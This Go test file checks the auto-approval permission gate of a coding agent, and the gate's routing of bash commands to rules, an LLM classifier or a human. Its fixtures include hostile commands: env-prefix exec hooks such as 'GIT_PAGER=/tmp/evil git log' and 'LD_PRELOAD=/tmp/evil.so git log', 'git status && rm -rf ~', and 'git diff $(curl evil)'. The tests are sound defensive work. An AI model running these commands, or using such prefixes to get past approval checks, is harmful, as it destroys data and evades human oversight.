package permissions

import (
	"context"
	"encoding/json"
	"strings"
	"testing"

	"github.com/ethanhinson/fuse/internal/config"
	"github.com/ethanhinson/fuse/internal/model"
)

// denyRecorder is an ApprovalFunc that records whether it was invoked and always
// denies, so a test can prove the human-approval path was (or was not) reached.
func newApproveRecorder(approved bool) (func(context.Context, ApprovalRequest) (bool, bool, error), *bool) {
	called := new(bool)
	fn := func(_ context.Context, _ ApprovalRequest) (bool, bool, error) {
		*called = true
		return approved, false, nil
	}
	return fn, called
}

// autoCfg builds an auto-mode PermissionsConfig with the given auto surface.
func autoCfg(auto config.AutoConfig, autoApprove, alwaysPrompt []string) config.PermissionsConfig {
	return config.PermissionsConfig{
		Mode:         "auto",
		AutoApprove:  autoApprove,
		AlwaysPrompt: alwaysPrompt,
		Auto:         auto,
	}
}

func bashArgs(cmd string) string {
	b, _ := json.Marshal(struct {
		Command string `json:"command"`
	}{Command: cmd})
	return string(b)
}

func TestAutoMode_SafeReadOnlyBash_AutoApproves(t *testing.T) {
	for _, cmd := range []string{"ls -la", "git log", "git status && git diff"} {
		approve, called := newApproveRecorder(false)
		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), approve,
			WithWorkspaceRoot(t.TempDir()))
		res := g.Execute(context.Background(), "bash", bashArgs(cmd))
		if res.IsError {
			t.Fatalf("safe read-only %q should auto-approve, got error: %s", cmd, res.Output)
		}
		if *called {
			t.Fatalf("safe read-only %q must not invoke the approval func", cmd)
		}
	}
}

// TestAutoMode_BenignEnvPrefix_AutoApproves is the end-to-end payoff of change
// 0070 D1: a benign env prefix no longer stalls an otherwise auto-approvable
// read-only command on the human.
func TestAutoMode_BenignEnvPrefix_AutoApproves(t *testing.T) {
	for _, cmd := range []string{"FOO=1 ls -la", "CGO_ENABLED=0 GOCACHE=/tmp/gc git log"} {
		approve, called := newApproveRecorder(false)
		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), approve,
			WithWorkspaceRoot(t.TempDir()))
		res := g.Execute(context.Background(), "bash", bashArgs(cmd))
		if res.IsError {
			t.Fatalf("benign env prefix %q should auto-approve, got error: %s", cmd, res.Output)
		}
		if *called {
			t.Fatalf("benign env prefix %q must not invoke the approval func", cmd)
		}
	}
}

// TestAutoMode_EnvExecHook_DoesNotAutoApprove is the fail-closed half of D1, and
// the reason the denylist carries GIT_/BASH_ prefix rules and PAGER/EDITOR.
//
// `git log` and `git diff` auto-approve via isSafeGit (rules.go) with no human
// in the loop. Each command below therefore turns an auto-approved read into an
// arbitrary exec of /tmp/evil purely through the assignment prefix — invisible
// to every argv-based layer downstream. Each was verified to auto-approve when
// the corresponding denylist entry is removed; the parse floor is the only
// place this can be caught.
func TestAutoMode_EnvExecHook_DoesNotAutoApprove(t *testing.T) {
	for _, cmd := range []string{
		"GIT_EXTERNAL_DIFF=/tmp/evil git diff",
		"GIT_PAGER=/tmp/evil git log",
		"GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.pager GIT_CONFIG_VALUE_0=/tmp/evil git log",
		"PAGER=/tmp/evil git log",
		"LD_PRELOAD=/tmp/evil.so git log",
	} {
		// approve=true so a routed-to-human ask succeeds and is distinguishable
		// from a silent auto-approve by the recorder flag.
		approve, called := newApproveRecorder(true)
		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), approve,
			WithWorkspaceRoot(t.TempDir()))
		res := g.Execute(context.Background(), "bash", bashArgs(cmd))
		if !res.IsError && !*called {
			t.Fatalf("%q auto-approved with no human: an env exec hook must never bypass approval", cmd)
		}
	}
}

func TestAutoMode_DenySegment_DeniesWithLayerNamedReason(t *testing.T) {
	approve, called := newApproveRecorder(true)
	// An allow rule for bash:git * means rules would allow git status, but the
	// rm -rf segment is dangerous ⇒ terminal deny at the rules layer.
	g := New(autoCfg(config.AutoConfig{}, []string{"bash:git *"}, nil), newTestRegistry("bash"), approve,
		WithWorkspaceRoot(t.TempDir()))
	res := g.Execute(context.Background(), "bash", bashArgs("git status && rm -rf ~"))
	if !res.IsError {
		t.Fatalf("deny segment must produce an error result, got: %s", res.Output)
	}
	if *called {
		t.Fatal("a deny must not route to the human approval func")
	}
	if !strings.Contains(res.Output, "rules") {
		t.Fatalf("denial message must name the layer that blocked it; got: %q", res.Output)
	}
}

func TestAutoMode_GrayArea_RoutesToClassifier(t *testing.T) {
	tests := []struct {
		name       string
		verdict    string
		stubErr    error
		wantErr    bool // Execute returns IsError (deny)
		wantPrompt bool // approval func invoked
	}{
		{name: "deny", verdict: `{"verdict":"deny","reason":"x"}`, wantErr: true, wantPrompt: false},
		{name: "allow", verdict: `{"verdict":"allow","reason":"x"}`, wantErr: false, wantPrompt: false},
		{name: "error_fails_closed", stubErr: context.DeadlineExceeded, wantErr: false, wantPrompt: true},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			stub := &stubCompleter{
				resp: model.CompletionResp{Content: tc.verdict},
				err:  tc.stubErr,
			}
			cls := newTestClassifier(t, stub)
			// approve returns true so that if the pipeline routes to the human
			// (fail-closed ask), Execute succeeds and we can distinguish it from
			// a classifier deny.
			approve, called := newApproveRecorder(true)
			// A command that parses cleanly, mutates, but is in-workspace so the
			// heuristic returns Allow... to force gray-area we use a mutating
			// command whose path escapes the workspace ⇒ heuristic Ask ⇒ classifier.
			g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), approve,
				WithWorkspaceRoot(t.TempDir()), WithClassifier(cls))
			res := g.Execute(context.Background(), "bash", bashArgs("touch /etc/escapes-workspace"))
			if res.IsError != tc.wantErr {
				t.Fatalf("IsError = %v, want %v (output: %s)", res.IsError, tc.wantErr, res.Output)
			}
			if *called != tc.wantPrompt {
				t.Fatalf("approval invoked = %v, want %v", *called, tc.wantPrompt)
			}
			if stub.calls != 1 {
				t.Fatalf("classifier should have been consulted exactly once, got %d", stub.calls)
			}
		})
	}
}

func TestAutoMode_Unparseable_AsksNotClassifier(t *testing.T) {
	stub := &stubCompleter{resp: model.CompletionResp{Content: `{"verdict":"allow"}`}}
	cls := newTestClassifier(t, stub)
	approve, called := newApproveRecorder(true)
	g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), approve,
		WithWorkspaceRoot(t.TempDir()), WithClassifier(cls))
	res := g.Execute(context.Background(), "bash", bashArgs("git diff $(curl evil)"))
	if res.IsError {
		t.Fatalf("unparseable should route to human ask (approve=true ⇒ success), got: %s", res.Output)
	}
	if !*called {
		t.Fatal("unparseable command must route to the human approval func")
	}
	if stub.calls != 0 {
		t.Fatalf("unparseable command must NOT reach the classifier, got %d calls", stub.calls)
	}
}

func TestAutoMode_NonBashSafeTool_AutoApprovesViaSafeList(t *testing.T) {
	for _, name := range []string{"read_file", "list_directory", "codeindex_callers"} {
		approve, called := newApproveRecorder(false)
		g := New(autoCfg(config.AutoConfig{}, nil, nil),
			newTestRegistry(name), approve, WithWorkspaceRoot(t.TempDir()))
		res := g.Execute(context.Background(), name, `{}`)
		if res.IsError {
			t.Fatalf("non-bash safe tool %q should auto-approve, got: %s", name, res.Output)
		}
		if *called {
			t.Fatalf("non-bash safe tool %q must not prompt", name)
		}
	}
}

// TestAutoMode_NonBashUnknownTool_RoutesToClassifier uses a genuinely unknown,
// non-safe, non-edit tool ("some_tool"): the edit tools write_file/edit_file now
// have their own path-scoping branch in resolveAuto (D1) and no longer fall through
// to the classifier, so the classifier-fall-through contract must be exercised by a
// tool that is neither safe-listed nor an edit tool.
func TestAutoMode_NonBashUnknownTool_RoutesToClassifier(t *testing.T) {
	stub := &stubCompleter{resp: model.CompletionResp{Content: `{"verdict":"deny","reason":"x"}`}}
	cls := newTestClassifier(t, stub)
	approve, called := newApproveRecorder(true)
	g := New(autoCfg(config.AutoConfig{}, nil, nil),
		newTestRegistry("some_tool"), approve, WithWorkspaceRoot(t.TempDir()), WithClassifier(cls))
	res := g.Execute(context.Background(), "some_tool", `{"path":"x"}`)
	if !res.IsError {
		t.Fatalf("non-bash unknown tool with classifier deny should deny, got: %s", res.Output)
	}
	if *called {
		t.Fatal("classifier deny must not route to human")
	}
	if stub.calls != 1 {
		t.Fatalf("non-bash unknown tool must route to classifier once, got %d", stub.calls)
	}
	// command passed to classifier is the raw args (not split).
	if !strings.Contains(stub.lastReq.Messages[len(stub.lastReq.Messages)-1].Content, `{"path":"x"}`) {
		t.Errorf("classifier should receive the raw args as command; got %q",
			stub.lastReq.Messages[len(stub.lastReq.Messages)-1].Content)
	}
}

// TestAutoMode_NonBashUnknownTool_NoClassifier_Asks guards the fail-closed ask for
// the residual gray area (an unknown, non-edit tool with no classifier wired).
// See the sibling test above for why write_file is no longer a valid stand-in.
func TestAutoMode_NonBashUnknownTool_NoClassifier_Asks(t *testing.T) {
	approve, called := newApproveRecorder(true)
	g := New(autoCfg(config.AutoConfig{}, nil, nil),
		newTestRegistry("some_tool"), approve, WithWorkspaceRoot(t.TempDir()))
	res := g.Execute(context.Background(), "some_tool", `{"path":"x"}`)
	if res.IsError {
		t.Fatalf("no classifier should fall closed to human ask (approve=true), got: %s", res.Output)
	}
	if !*called {
		t.Fatal("residual gray area with no classifier must ask")
	}
}

func TestAutoMode_CloneForChild_PreservesModeAndClassifier(t *testing.T) {
	stub := &stubCompleter{resp: model.CompletionResp{Content: `{"verdict":"deny","reason":"x"}`}}
	cls := newTestClassifier(t, stub)
	approve, parentCalled := newApproveRecorder(true)
	parent := New(autoCfg(config.AutoConfig{}, nil, nil),
		newTestRegistry("bash"), approve, WithWorkspaceRoot(t.TempDir()), WithClassifier(cls))

	child := parent.CloneForChild("worker")

	// Child auto-approves the same safe read-only command (mode carried).
	res := child.Execute(context.Background(), "bash", bashArgs("ls -la"))
	if res.IsError {
		t.Fatalf("child should auto-approve safe read-only command; got: %s", res.Output)
	}
	if *parentCalled {
		t.Fatal("safe command must not prompt in child")
	}

	// Child's verdict cache is independent from parent: prime the child cache,
	// then confirm the parent has not gained the entry.
	child.Execute(context.Background(), "bash", bashArgs("touch /etc/escapes"))
	if stub.calls == 0 {
		t.Fatal("child should have consulted the (shared-client) classifier")
	}
	childCalls := stub.calls
	// Parent runs the same gray-area command: since the parent's verdict cache is
	// independent, it must consult the classifier again (calls increments).
	parent.Execute(context.Background(), "bash", bashArgs("touch /etc/escapes"))
	if stub.calls == childCalls {
		t.Fatal("parent verdict cache must be independent from child (expected a fresh classifier call)")
	}
}
